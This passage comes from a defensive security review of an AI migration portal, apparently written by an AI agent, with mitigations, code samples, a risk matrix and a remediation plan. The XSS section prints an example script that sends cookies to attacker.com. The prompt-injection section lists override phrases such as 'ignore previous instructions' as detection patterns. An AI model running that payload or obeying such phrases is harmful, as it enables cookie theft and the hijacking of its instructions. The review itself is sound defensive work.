        'path': request.url.path,
        'user_id': getattr(request.state, 'user_id', 'unknown'),
    })

    # Return sanitized error to client
    return JSONResponse(
        status_code=500,
        content={
            'error': 'An error occurred processing your request.',
            'code': 'PROCESSING_ERROR',
            # Never include: str(exc), traceback, file paths, SQL errors
        }
    )

# For specific known errors, return actionable messages
@app.exception_handler(FileTooLargeError)
async def file_too_large_handler(request: Request, exc: FileTooLargeError):
    return JSONResponse(
        status_code=413,
        content={'error': 'File exceeds maximum upload size of 50MB.', 'code': 'FILE_TOO_LARGE'}
    )
```

**Prohibited in error responses**:
- Stack traces
- File system paths
- Database query strings
- Third-party API error messages (log them, don't forward them)
- User data echoed back in error context

---

### LOW-002: API Versioning and Endpoint Hygiene

**Severity**: LOW
**Category**: Maintainability / Accidental Exposure

**Recommendations**:
1. Version all migration endpoints: `/api/v1/migration/...`
2. Disable or remove any debug/test endpoints before production deployment
3. Return a consistent response schema — do not leak database column names in JSON responses
4. Confirm that OAuth callback endpoints (`/oauth/callback/notion`, etc.) are not accessible in production before the OAuth integration is complete

---

## 5. Processing Pipeline Security

### HIGH-011: Conversation Content Sanitization (XSS via Imported HTML)

**Severity**: HIGH
**Category**: Stored XSS

**Threat**: Conversation history from ChatGPT may include HTML content if the user imported or received HTML in their conversations. If extracted content (topics, style descriptions, custom instructions) is later rendered in the portal UI without sanitization, a malicious payload in a conversation can execute as XSS in the user's browser.

**Attack vector example**: A user's ChatGPT conversation contains:
```
User: "How do I write this HTML? <script>document.location='https://attacker.com/steal?c='+document.cookie</script>"
```
The pattern extractor includes this topic. It gets stored in `domain_vocabulary`. It later renders in the Step 4 UI via `innerHTML`. XSS fires.

**Required mitigations**:

1. **Never render extracted content via `innerHTML`** — always use `textContent` or a sanitization library.

```javascript
// WRONG — XSS vector
taskCard.innerHTML = `<h3>${topic}</h3>`;

// CORRECT — text only
const h3 = document.createElement('h3');
h3.textContent = topic;  // Escapes all HTML entities
taskCard.appendChild(h3);
```

2. **If HTML rendering is required** (e.g., markdown preview), use DOMPurify:

```javascript
import DOMPurify from 'dompurify';

// Safe — strips all script tags, event handlers, dangerous attributes
const cleanHtml = DOMPurify.sanitize(userContent, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'ul', 'ol', 'li', 'br'],
    ALLOWED_ATTR: [],  // No attributes — eliminates all event handler vectors
});
element.innerHTML = cleanHtml;
```

3. **Server-side extraction**: Strip all HTML from extracted patterns before they are stored in `user_context_profile`.

```python
import html
import re

def strip_html(text: str) -> str:
    """Remove all HTML tags and decode entities."""
    no_tags = re.sub(r'<[^>]+>', '', text)
    return html.unescape(no_tags)

def sanitize_extracted_topic(topic: str) -> str:
    topic = strip_html(topic)
    topic = topic[:100]  # Max length to prevent stored XSS via long strings
    return topic.strip()
```

---

### HIGH-012: JSON Parsing Safety — Prototype Pollution

**Severity**: HIGH
**Category**: Prototype Pollution / Application Logic Corruption

**Threat**: JavaScript `JSON.parse()` is generally safe from prototype pollution (unlike `_.merge()` or `Object.assign()` with user input), but downstream operations that spread parsed JSON into application objects can introduce pollution vectors.

**The conversations.json parsing is server-side (Python) — but if any client-side JavaScript processes migration data:**

```javascript
// DANGEROUS — prototype pollution if userInput contains __proto__
const config = Object.assign({}, defaultConfig, userProvidedConfig);

// DANGEROUS — lodash merge with user input
_.merge(appState, parsedJson);

// SAFE — JSON.parse itself, then explicit property extraction
const parsed = JSON.parse(jsonString);
const safeData = {
    topic: String(parsed.topic || ''),
    count: Number(parsed.count || 0),
    // Only extract expected properties explicitly
};
```

**Python server-side JSON parsing**:

```python
import json

def safe_parse_conversations(json_string: str) -> list:
    try:
        data = json.loads(json_string)
    except json.JSONDecodeError as e:
        raise ValueError(f"Invalid JSON in conversation file: {e}")

    if not isinstance(data, (dict, list)):
        raise ValueError("Unexpected JSON root type")

    # For ChatGPT format: expect a list or dict with 'conversations' key
    if isinstance(data, dict):
        conversations = data.get('conversations', [])
    else:
        conversations = data

    if not isinstance(conversations, list):
        raise ValueError("Conversations must be a list")

    return conversations

# Process each conversation with type checking — never trust schema
def extract_message_content(message: dict) -> str:
    if not isinstance(message, dict):
        return ''
    content = message.get('content', '')
    if not isinstance(content, str):
        return ''
    return content[:10000]  # Hard cap per message
```

---

### MEDIUM-009: Memory Limits for Large File Processing

**Severity**: MEDIUM
**Category**: Resource Exhaustion

**Threat**: A legitimate ChatGPT export for a heavy user could be 100MB+ of JSON (millions of messages). Loading this entirely into memory could exhaust application memory.

**Required approach — streaming processing**:

```python
import json
from typing import Iterator

def stream_conversations(json_file_path: str) -> Iterator[dict]:
    """
    Stream-parse conversations.json without loading entire file into memory.
    Uses ijson for streaming JSON parsing.
    """
    import ijson  # pip install ijson

    with open(json_file_path, 'rb') as f:
        # Stream the 'conversations' array without loading entire file
        parser = ijson.items(f, 'conversations.item')
        count = 0
        for conversation in parser:
            count += 1
            if count > 10000:  # Hard limit on conversations processed
                break
            yield conversation

def extract_patterns_from_stream(file_path: str) -> dict:
    """Extract patterns from conversation stream without loading all into memory."""
    topic_counter = {}
    message_count = 0

    for conv in stream_conversations(file_path):
        for message in conv.get('mapping', {}).values():
            msg = message.get('message', {})
            if msg and msg.get('author', {}).get('role') == 'user':
                content = extract_message_content(msg)
                update_topic_counter(topic_counter, content)
                message_count += 1
                if message_count > 100000:  # Hard cap on messages processed
                    break

    return {
        'top_topics': sorted(topic_counter.items(), key=lambda x: x[1], reverse=True)[:10],
        'message_count': message_count,
    }
```

**Memory limit for processing worker**: Set Python process memory limit (see MEDIUM-002 sandbox section) in addition to streaming.

---

### MEDIUM-010: Async Job Queue Security

**Severity**: MEDIUM
**Category**: Job Queue Injection / Unauthorized Processing

**Threat**: The spec references "async jobs" for the processing pipeline. Job queues (Celery, RQ, Bull, etc.) can be vulnerable to:
- Job parameter injection (user supplies malicious parameters)
- Unauthorized job polling (user polls other users' jobs)
- Queue flooding (unlimited job submission)

**Required controls**:

1. **Job parameter sanitization**: Validate all job parameters server-side when the job is created. Do not accept raw user input as job parameters.

```python
def enqueue_migration_job(user_id: str, file_path: str, migration_config: dict):
    # Validate before enqueue
    assert os.path.realpath(file_path).startswith(TEMP_DIR), "Invalid file path"
    assert file_path.endswith('.enc'), "Expected encrypted temp file"

    validated_config = {
        'include_conversations': bool(migration_config.get('include_conversations', True)),
        'include_custom_instructions': bool(migration_config.get('include_custom_instructions', True)),
    }

    job = queue.enqueue(
        process_migration_file,
        user_id=user_id,
        file_path=file_path,
        config=validated_config,
    )
    db.store_job_mapping(job.id, user_id)  # For ownership verification on status checks
    return job.id
```

2. **Job ownership verification** on all status endpoints (see HIGH-009).

3. **Queue-level rate limiting**: Limit maximum concurrent jobs per user to 2. Reject new job submissions if limit is reached.

4. **Dead letter queue**: Failed jobs must not be automatically retried more than 3 times. After 3 failures, mark as failed and notify the user. Never retry jobs that failed due to validation errors (which would fail identically on retry).

---

### LOW-003: Custom Instructions Extraction — Prompt Injection Risk

**Severity**: LOW (contained to user's own context)
**Category**: Indirect Prompt Injection

**Note**: When PureBrain absorbs a user's custom instructions from ChatGPT and feeds them into the AI partner's system prompt, a sophisticated user could craft custom instructions that are adversarial prompts. Since this affects only their own AI partner, the risk is contained — but worth documenting.

**Mitigation**: Apply a max length cap on custom instructions (2000 characters) before storing. Review extracted custom instructions against a basic injection pattern list:

```python
INJECTION_PATTERNS = [
    'ignore previous instructions',
    'ignore all instructions',
    'you are now',
    'your new instructions',
    'disregard your',
]

def validate_custom_instructions(text: str) -> str:
    text = text[:2000]  # Hard cap
    lower = text.lower()
    for pattern in INJECTION_PATTERNS:
        if pattern in lower:
            # Log for review but still allow — user is only affecting their own context
            logger.warning(f"Potential injection pattern in custom instructions: '{pattern}'")
    return text
```

---

### LOW-004: Processing Timeout Enforcement

**Severity**: LOW
**Category**: Resource Exhaustion

**Required timeouts**:

| Operation | Max Duration | Action on Timeout |
|-----------|-------------|-------------------|
| File upload | 60 seconds | Abort upload, delete partial file |
| ZIP decompression | 30 seconds | Kill worker, mark job failed |
| Conversation parsing | 120 seconds | Kill worker, mark job failed |
| OAuth API call (single) | 10 seconds | Retry once, then fail |
| Full migration pipeline | 10 minutes | Kill worker, send "We'll email you" |

---

### LOW-005: Logging Security — No Sensitive Data in Logs

**Severity**: LOW (but common failure mode)
**Category**: Sensitive Data Exposure via Logs

**Prohibited in logs**:
- File contents (even partial)
- OAuth tokens or refresh tokens
- User email addresses (use user_id only)
- Conversation message content
- Custom instructions text

**Required log format**:

```python
# WRONG
logger.info(f"Processing file {file_path} for {user_email}: {file_contents[:100]}")

# CORRECT
logger.info("Processing migration file", extra={
    'user_id': user_id,          # Not email
    'file_size': file_size,      # Metadata only
    'provider': provider,
    'job_id': job_id,
})
```

---

## 6. Risk Matrix

| ID | Issue | Category | Severity | Effort to Fix | Priority |
|----|-------|----------|----------|---------------|----------|
| CRIT-001 | ZIP bomb / decompression bomb | File Upload | CRITICAL | Medium (1-2 days) | P0 — block on |
| CRIT-002 | Zip slip path traversal | File Upload | CRITICAL | Low (hours) | P0 — block on |
| CRIT-003 | Canva PKCE not enforced | OAuth | CRITICAL | Low (hours) | P0 — block on |
| CRIT-004 | HubSpot third-party PII storage | Data Privacy | CRITICAL | Medium (1-2 days) | P0 — block on |
| HIGH-001 | File type validation — magic bytes | File Upload | HIGH | Low (hours) | P1 |
| HIGH-002 | No upload size limit at HTTP layer | File Upload | HIGH | Low (hours) | P1 |
| HIGH-003 | No malware scanning | File Upload | HIGH | Medium (1 day) | P1 |
| HIGH-004 | State parameter CSRF prevention | OAuth | HIGH | Low (hours) | P1 |
| HIGH-005 | OAuth tokens in database (not vault) | OAuth | HIGH | High (3+ days) | P1 |
| HIGH-006 | Over-broad OAuth scopes | OAuth | HIGH | Low (hours) | P1 |
| HIGH-007 | No consent capture mechanism | Privacy/GDPR | HIGH | Low (1 day) | P1 |
| HIGH-008 | Right to erasure not implemented | Privacy/GDPR | HIGH | Medium (2 days) | P1 |
| HIGH-009 | Migration endpoints lack auth enforcement | API Security | HIGH | Low (hours) | P1 |
| HIGH-010 | No rate limiting on upload endpoint | API Security | HIGH | Low (1 day) | P1 |
| HIGH-011 | Stored XSS via conversation content | Pipeline | HIGH | Low (hours) | P1 |
| HIGH-012 | Prototype pollution in JSON processing | Pipeline | HIGH | Low (hours) | P1 |
| MEDIUM-001 | Temp files not encrypted at rest | File Upload | MEDIUM | Medium (1-2 days) | P2 |
| MEDIUM-002 | No sandbox for file processing | File Upload | MEDIUM | High (2-3 days) | P2 |
| MEDIUM-003 | Token refresh/rotation not defined | OAuth | MEDIUM | Medium (1-2 days) | P2 |
| MEDIUM-004 | Data retention not enforced | Privacy/GDPR | MEDIUM | Medium (1 day) | P2 |
| MEDIUM-005 | Cross-border transfer not addressed | Privacy/GDPR | MEDIUM | High (architectural) | P2 |
| MEDIUM-006 | Input validation gaps | API Security | MEDIUM | Low (hours) | P2 |
| MEDIUM-007 | CORS misconfiguration risk | API Security | MEDIUM | Low (hours) | P2 |
| MEDIUM-008 | Verbose error messages | API Security | MEDIUM | Low (hours) | P2 |
| MEDIUM-009 | Large file memory exhaustion | Pipeline | MEDIUM | Medium (1-2 days) | P2 |
| MEDIUM-010 | Job queue injection/flooding | Pipeline | MEDIUM | Medium (1-2 days) | P2 |
| LOW-001 | PII not stripped from extracted vocabulary | Privacy | LOW | Low (hours) | P3 |
| LOW-002 | API versioning / endpoint hygiene | API Security | LOW | Low (hours) | P3 |
| LOW-003 | Custom instructions prompt injection | Pipeline | LOW | Low (hours) | P3 |
| LOW-004 | Processing timeouts not defined | Pipeline | LOW | Low (hours) | P3 |
| LOW-005 | Sensitive data in logs | Pipeline | LOW | Low (hours) | P3 |

---

## Implementation Recommendations Summary

### Before Writing Any Code

1. **Finalize vault architecture**: Choose between HashiCorp Vault and KMS envelope encryption. This decision affects the entire token storage layer. Do not start OAuth integration until this is decided.

2. **Define data residency**: Decide which cloud region processes EU user data. This affects CORS, logging, and GDPR compliance.

3. **HubSpot integration**: Add explicit integration tests that assert no PII fields exist in any HubSpot parser output. Make these tests mandatory in CI — they cannot be skipped.

### During Implementation (Sequenced)

**Week 1-2 security foundations** (should run parallel to spec's implementation sequence):

1. Implement `safe_unzip()` with all limits before any ZIP parsing code (CRIT-001, CRIT-002)
2. Set up vault infrastructure (HIGH-005)
3. Write global error handler (MEDIUM-008)
4. Configure CORS allowlist (MEDIUM-007)
5. Add nginx upload size limit (HIGH-002)

**Week 3 (Portal UI)**:

6. Add consent checkbox to Step 1 UI (HIGH-007)
7. Use `textContent` exclusively for rendering extracted data (HIGH-011)
8. Add authentication middleware to all migration routes (HIGH-009)
9. Implement state parameter for all OAuth flows (HIGH-004)
10. Implement PKCE for Canva OAuth (CRIT-003)

**Week 4**:

11. Implement rate limiting on upload and OAuth endpoints (HIGH-010)
12. Implement erasure endpoint with cascade delete (HIGH-008)
13. Add malware scanning to upload pipeline (HIGH-003)

**Before Production**:

14. Security review of all parser outputs — confirm no raw content stored
15. Penetration test on file upload endpoint (zip slip, zip bomb, type confusion)
16. Verify OAuth CSRF with automated test
17. Confirm temp file cleanup via integration test

---

## Memory Written

**Path**: `/home/jared/projects/AI-CIV/aether/.claude/memory/agent-learnings/security-engineer-tech/2026-02-23--migration-portal-security-review.md`
**Type**: security-analysis
**Topic**: Pre-implementation security review for AI Migration Portal

Key patterns captured for future reviews:
- File upload pipelines: always validate BEFORE decompression, not after
- ZIP handling requires THREE layers: compressed size limit + decompression limit + path traversal check
- HubSpot (any CRM) integration pattern: in-memory only, assert_no_pii test in CI is mandatory
- OAuth flows: PKCE + state parameter are both required, not optional "if supported"
- Vault architecture decision gates ALL OAuth integration work — decide first

---

**END OF REVIEW**

**Review classification**: Pre-implementation (no code yet — architectural decisions still open)
**Prepared by**: security-engineer-tech
**For use by**: full-stack-developer (implementation), Jared (scope decisions on vault and data residency)
**Next review**: After implementation of P0 items, before first deployment to staging
